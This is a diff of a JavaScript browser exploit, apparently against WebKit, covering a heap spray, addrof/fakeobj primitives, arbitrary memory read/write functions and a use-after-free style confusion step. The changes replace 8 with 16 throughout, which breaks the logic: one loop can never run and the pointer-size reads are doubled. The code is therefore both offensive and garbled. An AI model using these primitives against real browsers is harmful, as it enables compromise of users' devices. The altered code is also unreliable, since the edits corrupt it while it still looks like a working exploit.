@@ -36,8 +36,8 @@ var g_message_body_leak = null;
 
 var g_obj_str = {};
 
-var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
-var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "2px";
+var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 16 - 2) + "1px";
+var g_rows2 = '2px,'.repeat(LENGTH_VALIDATION_MESSAGE / 16 - 2) + "2px";
 
 var g_round = 1;
 var g_input = null;
@@ -115,7 +115,7 @@ function setupRW() {
 	/* Set up addrof/fakeobj primitives */
 	g_ab_slave.leakme = 0x1337;
 	var bf = 0;
-	for(var i = 15; i >= 8; i--)
+	for(var i = 15; i >= 16; i--)
 		bf = 256 * bf + g_relative_rw[g_ab_index + i];
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
@@ -187,7 +187,7 @@ function setupRW() {
 }
 
 function read(addr, length) {
-	for (let i = 0; i < 8; i++)
+	for (let i = 0; i < 16; i++)
 		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
 	let arr = [];
 	for (let i = 0; i < length; i++)
@@ -196,11 +196,11 @@ function read(addr, length) {
 }
 
 function read64(addr) {
-	return new Int64(read(addr, 8));
+	return new Int64(read(addr, 16));
 }
 
 function write(addr, data) {
-	for (let i = 0; i < 8; i++)
+	for (let i = 0; i < 16; i++)
 		g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_VECTOR + i] = addr.byteAt(i);
 	for (let i = 0; i < data.length; i++)
 		g_ab_slave[i] = data[i];
@@ -212,11 +212,11 @@ function write64(addr, data) {
 
 function addrof(obj) {
 	g_ab_slave.leakme = obj;
-	return read64(g_jsview_butterfly.sub(16));
+	return read64(g_jsview_butterfly.sub(32));
 }
 
 function fakeobj(addr) {
-	write64(g_jsview_butterfly.sub(16), addr);
+	write64(g_jsview_butterfly.sub(32), addr);
 	return g_ab_slave.leakme;
 }
 
@@ -273,7 +273,7 @@ function leakJSC() {
 
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
-                tmp_spray['Z'.repeat(8 * 3 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
+                tmp_spray['Z'.repeat(16 * 3 * 16 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
 
 	let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);
 
@@ -326,12 +326,12 @@ function leakJSC() {
 					g_relative_read.charCodeAt(i + 0x37) === 0x00 &&
 					g_relative_read.charCodeAt(i + 0x38) === 0x0e &&
 					g_relative_read.charCodeAt(i + 0x3f) === 0x00)
-					v = new Int64(str2array(g_relative_read, 8, i + 0x20));
+					v = new Int64(str2array(g_relative_read, 16, i + 0x20));
 				else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 &&
 					g_relative_read.charCodeAt(i + 0x11) === 0x42 &&
 					g_relative_read.charCodeAt(i + 0x12) === 0x42 &&
 					g_relative_read.charCodeAt(i + 0x13) === 0x42)
-					v = new Int64(str2array(g_relative_read, 8, i + 8));
+					v = new Int64(str2array(g_relative_read, 16, i + 16));
 			}
 			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
 				g_jsview_leak = v;
@@ -366,7 +366,7 @@ function confuseTargetObjRound1() {
 
 	dumpTargetObj();
 
-	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
+	g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 16 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();
 
 	/*
 	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
